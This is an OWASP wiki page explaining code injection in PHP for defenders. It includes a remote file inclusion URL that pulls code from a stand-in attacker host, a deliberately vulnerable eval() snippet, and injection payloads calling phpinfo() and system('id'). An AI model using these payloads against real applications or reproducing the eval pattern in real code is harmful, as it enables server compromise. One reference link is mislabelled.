---

layout: col-sidebar
title: Code Injection
author: Weilin Zhong, Rezos
contributors: OWASP, Thandermax, Csa, KristenS, Wichers, Neil Bergman, Camilo, Andrew Smith, kingthorin
permalink: /attacks/Code_Injection
tags: attack, Code Injection

---

{% include writers.html %}

## Description

Code Injection is the general term for attack types which consist of
injecting code that is then interpreted/executed by the application.
This type of attack exploits poor handling of untrusted data. These
types of attacks are usually made possible due to a lack of proper
input/output data validation, for example:

- allowed characters (standard regular expressions classes or custom)
- data format
- amount of expected data

Code Injection differs from [Command
Injection](Command_Injection) in that an attacker is only
limited by the functionality of the injected language itself. If an
attacker is able to inject PHP code into an application and have it
executed, they are only limited by what PHP is capable of. Command
injection consists of leveraging existing code to execute commands,
usually within the context of a shell.

## Risk Factors

- These types of vulnerabilities can range from very hard to find, to easy to find
- If found, are usually moderately hard to exploit, depending of scenario
- If successfully exploited, impact could cover loss of confidentiality, loss of integrity, loss of availability, and/or loss of accountability

## Examples

**Example 1**

If an application passes a parameter sent via a GET request to the PHP
`include()` function with no input validation, the attacker may try to
execute code other than what the developer had in mind.

The URL below passes a page name to the `include()` function.
`http://testsite.com/index.php?page=contact.php`

The file "evilcode.php" may contain, for example, the phpinfo() function
which is useful for gaining information about the configuration of the
environment in which the web service runs. An attacker can ask the
application to execute their PHP code using the following request:
`http://testsite.com/?page=http://evilsite.com/evilcode.php`

**Example 2**

When a developer uses the PHP `eval()` function and passes it untrusted
data that an attacker can modify, code injection could be possible.

The example below shows a dangerous way to use the `eval()` function:

```
$myvar = "varname";
$x = $_GET['arg'];
eval("$myvar = $x;");
```

As there is no input validation, the code above is vulnerable to a Code
Injection attack.

For example: `/index.php?arg=1; phpinfo()`

While exploiting bugs like these, an attacker may want to execute system
commands. In this case, a code injection bug can also be used for
command injection, for example: `/index.php?arg=1; system('id')`

## References

- [CWE-77: Command Injection](http://cwe.mitre.org/data/definitions/77.html)
- [CWE-78: OS Command Injection](http://cwe.mitre.org/data/definitions/78.html)
- [CWE-89: SQL Injection](http://cwe.mitre.org/data/definitions/77.html)

[Category:Injection](https://owasp.org/www-community/Injection_Flaws)
